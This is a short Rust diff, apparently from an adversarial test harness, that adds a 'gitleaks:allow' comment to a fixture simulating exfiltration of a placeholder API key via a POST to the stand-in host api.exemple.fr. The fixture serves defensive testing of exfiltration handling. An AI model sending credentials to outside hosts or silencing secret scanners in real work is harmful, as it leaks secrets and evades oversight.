@@ -236,7 +236,7 @@ fn executer(scenario: &bench::adversarial::Scenario, s: &mut Systeme) -> Verdict
             "api.exemple.fr",
             "POST",
             "https://api.exemple.fr/notes",
-            b"cle=sk-ant-api03-abcdefghijklmnop",
+            b"cle=sk-ant-api03-abcdefghijklmnop", // gitleaks:allow — fixture d'exfiltration
         ),
         "exfil-par-url" => s.sortir(
             "api.exemple.fr",
